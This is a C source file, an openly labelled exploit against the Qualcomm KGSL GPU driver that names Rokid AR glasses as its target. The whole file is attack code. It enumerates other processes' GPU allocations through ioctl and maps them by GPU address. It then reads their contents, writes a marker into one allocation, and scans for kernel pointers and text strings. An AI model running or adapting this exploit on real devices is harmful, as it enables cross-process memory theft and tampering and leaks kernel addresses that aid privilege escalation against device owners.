/*
 * KGSL Cross-Process GPU Memory Attack
 * ======================================
 *
 * Exploit discovered vulnerabilities:
 * 1. Can enumerate GPU allocations of other processes via ID
 * 2. Can access any GPU memory via gpuaddr across FDs
 *
 * Attack Strategy:
 * 1. Enumerate all GPU memory IDs to find other process allocations
 * 2. Get their gpuaddr and size
 * 3. mmap those addresses from our FD
 * 4. Read/Write other process's GPU memory
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -o kgsl_crossproc kgsl_crossproc.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// ============================================================================
// KGSL Definitions
// ============================================================================

#define KGSL_IOC_TYPE 0x09

#define IOCTL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_GPUMEM_GET_INFO _IOWR(KGSL_IOC_TYPE, 0x34, struct kgsl_gpumem_get_info)

struct gpumem_alloc_req
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

struct kgsl_gpumem_get_info
{
    uint64_t gpuaddr;
    unsigned int id;
    unsigned int flags;
    uint64_t size;
    uint64_t mmapsize;
    uint64_t useraddr;
};

// ============================================================================
// Signal handling for safe memory access
// ============================================================================

static sigjmp_buf jmp_env;
static volatile sig_atomic_t sig_received = 0;

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

int safe_read(void *ptr, void *out, size_t len)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        memcpy(out, ptr, len);
        return 0;
    }
    return -1;
}

// ============================================================================
// GPU Memory Information
// ============================================================================

typedef struct
{
    unsigned int id;
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
    int is_ours; // Did we allocate this?
} gpu_alloc_info_t;

int kgsl_fd = -1;
gpu_alloc_info_t all_allocs[4096];
int alloc_count = 0;

// Our own allocations
uint64_t our_gpuaddrs[64];
int our_count = 0;

// ============================================================================
// Functions
// ============================================================================

void enumerate_gpu_memory(void)
{
    printf("\n=== Enumerating GPU Memory ===\n");

    alloc_count = 0;

    // Scan IDs 1 to 4000
    for (unsigned int id = 1; id <= 4000 && alloc_count < 4096; id++)
    {
        struct kgsl_gpumem_get_info info = {0};
        info.id = id;

        if (ioctl(kgsl_fd, IOCTL_GPUMEM_GET_INFO, &info) == 0)
        {
            gpu_alloc_info_t *a = &all_allocs[alloc_count];
            a->id = id;
            a->gpuaddr = info.gpuaddr;
            a->size = info.size;
            a->flags = info.flags;

            // Check if this is ours
            a->is_ours = 0;
            for (int i = 0; i < our_count; i++)
            {
                if (our_gpuaddrs[i] == info.gpuaddr)
                {
                    a->is_ours = 1;
                    break;
                }
            }

            alloc_count++;
        }
    }

    printf("[+] Found %d total GPU allocations\n", alloc_count);

    // Count ours vs others
    int ours = 0, others = 0;
    for (int i = 0; i < alloc_count; i++)
    {
        if (all_allocs[i].is_ours)
            ours++;
        else
            others++;
    }
    printf("[+] Ours: %d, Other processes: %d\n", ours, others);
}

void show_other_allocations(void)
{
    printf("\n=== Other Process GPU Allocations ===\n");

    int shown = 0;
    for (int i = 0; i < alloc_count && shown < 50; i++)
    {
        if (!all_allocs[i].is_ours)
        {
            printf("  ID=%u gpuaddr=0x%lx size=0x%lx flags=0x%x\n",
                   all_allocs[i].id,
                   all_allocs[i].gpuaddr,
                   all_allocs[i].size,
                   all_allocs[i].flags);
            shown++;
        }
    }

    if (shown == 0)
    {
        printf("  (no other process allocations found)\n");
    }
}

void try_access_other_memory(void)
{
    printf("\n=== Attempting Cross-Process Memory Access ===\n");

    int accessed = 0;
    int failed = 0;

    for (int i = 0; i < alloc_count && accessed < 20; i++)
    {
        if (all_allocs[i].is_ours)
            continue;
        if (all_allocs[i].size < 0x1000)
            continue;

        gpu_alloc_info_t *target = &all_allocs[i];

        // Try to mmap using the gpuaddr
        void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, kgsl_fd, target->gpuaddr);

        if (ptr != MAP_FAILED)
        {
            // Try to read
            uint8_t buf[64];
            if (safe_read(ptr, buf, 64) == 0)
            {
                printf("[!!!] ACCESSED ID=%u gpuaddr=0x%lx\n",
                       target->id, target->gpuaddr);

                // Show first bytes
                printf("  Data: ");
                for (int j = 0; j < 32; j++)
                {
                    printf("%02x", buf[j]);
                    if ((j + 1) % 8 == 0)
                        printf(" ");
                }
                printf("\n");

                // Check for interesting data
                uint64_t *vals = (uint64_t *)buf;
                for (int j = 0; j < 8; j++)
                {
                    // Check for kernel pointers
                    if ((vals[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL)
                    {
                        printf("  [!!!] KERNEL POINTER: 0x%lx\n", vals[j]);
                    }
                    // Check for userspace pointers
                    if ((vals[j] & 0xFFFF000000000000ULL) == 0x7F00000000000000ULL ||
                        (vals[j] & 0xFFFF000000000000ULL) == 0x0000000000000000ULL)
                    {
                        if (vals[j] > 0x1000 && vals[j] < 0x800000000000ULL)
                        {
                            printf("  [!] Possible user ptr: 0x%lx\n", vals[j]);
                        }
                    }
                }

                accessed++;
            }
            else
            {
                failed++;
            }
            munmap(ptr, 0x1000);
        }
        else
        {
            failed++;
        }
    }

    printf("[*] Successfully accessed: %d, Failed: %d\n", accessed, failed);
}

void try_write_other_memory(void)
{
    printf("\n=== Attempting Cross-Process Memory Write ===\n");

    for (int i = 0; i < alloc_count; i++)
    {
        if (all_allocs[i].is_ours)
            continue;
        if (all_allocs[i].size < 0x1000)
            continue;

        gpu_alloc_info_t *target = &all_allocs[i];

        void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, kgsl_fd, target->gpuaddr);

        if (ptr != MAP_FAILED)
        {
            uint8_t orig[64];
            if (safe_read(ptr, orig, 64) == 0)
            {
                // Write our marker
                uint64_t marker = 0xDEADC0DE13371337ULL;

                if (sigsetjmp(jmp_env, 1) == 0)
                {
                    *(volatile uint64_t *)ptr = marker;

                    // Read back
                    uint64_t readback = *(volatile uint64_t *)ptr;
                    if (readback == marker)
                    {
                        printf("[!!!] WRITE SUCCESS to ID=%u gpuaddr=0x%lx\n",
                               target->id, target->gpuaddr);
                        printf("  Original data: ");
                        for (int j = 0; j < 16; j++)
                            printf("%02x", orig[j]);
                        printf("\n");
                        printf("  After write: 0x%lx\n", readback);

                        // Restore original (be nice)
                        *(volatile uint64_t *)ptr = *(uint64_t *)orig;
                    }
                }
            }
            munmap(ptr, 0x1000);
            break; // Just test one
        }
    }
}

void scan_for_interesting_data(void)
{
    printf("\n=== Scanning for Interesting Data ===\n");

    int kernel_ptrs = 0;
    int text_found = 0;

    for (int i = 0; i < alloc_count; i++)
    {
        if (all_allocs[i].is_ours)
            continue;
        if (all_allocs[i].size < 0x1000)
            continue;

        gpu_alloc_info_t *target = &all_allocs[i];
        size_t scan_size = target->size < 0x10000 ? target->size : 0x10000;

        void *ptr = mmap(NULL, scan_size, PROT_READ,
                         MAP_SHARED, kgsl_fd, target->gpuaddr);

        if (ptr != MAP_FAILED)
        {
            uint8_t *p = (uint8_t *)ptr;

            // Scan for kernel pointers
            for (size_t off = 0; off < scan_size - 8; off += 8)
            {
                uint64_t val;
                if (safe_read(&p[off], &val, 8) == 0)
                {
                    if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL)
                    {
                        if (kernel_ptrs < 10)
                        {
                            printf("[!!!] Kernel ptr in ID=%u +0x%zx: 0x%lx\n",
                                   target->id, off, val);
                        }
                        kernel_ptrs++;
                    }
                }
            }

            // Scan for printable strings
            for (size_t off = 0; off < scan_size - 8; off++)
            {
                char str[64];
                if (safe_read(&p[off], str, 63) == 0)
                {
                    str[63] = 0;

                    // Check if printable
                    int printable = 1;
                    int len = 0;
                    for (int j = 0; j < 63 && str[j]; j++)
                    {
                        if (str[j] < 0x20 || str[j] > 0x7e)
                        {
                            printable = 0;
                            break;
                        }
                        len++;
                    }

                    if (printable && len > 8)
                    {
                        if (text_found < 20)
                        {
                            printf("[*] String in ID=%u +0x%zx: \"%s\"\n",
                                   target->id, off, str);
                        }
                        text_found++;
                        off += len; // Skip past this string
                    }
                }
            }

            munmap(ptr, scan_size);
        }
    }

    printf("[*] Found %d kernel pointers, %d strings\n", kernel_ptrs, text_found);
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Cross-Process GPU Memory Attack                         ║\n");
    printf("║  Target: Rokid AR Glasses                                     ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] kgsl_fd = %d\n", kgsl_fd);

    // Make some of our own allocations first
    printf("[*] Creating our own allocations...\n");
    for (int i = 0; i < 5; i++)
    {
        struct gpumem_alloc_req alloc = {0};
        alloc.size = 0x1000;
        if (ioctl(kgsl_fd, IOCTL_GPUMEM_ALLOC, &alloc) == 0)
        {
            our_gpuaddrs[our_count++] = alloc.gpuaddr;
        }
    }
    printf("[+] Created %d allocations\n", our_count);

    // Enumerate all GPU memory
    enumerate_gpu_memory();

    // Show other process allocations
    show_other_allocations();

    // Try to access other process memory
    try_access_other_memory();

    // Try to write to other process memory
    try_write_other_memory();

    // Scan for interesting data
    scan_for_interesting_data();

    close(kgsl_fd);

    printf("\n=== Attack Complete ===\n");
    return 0;
}
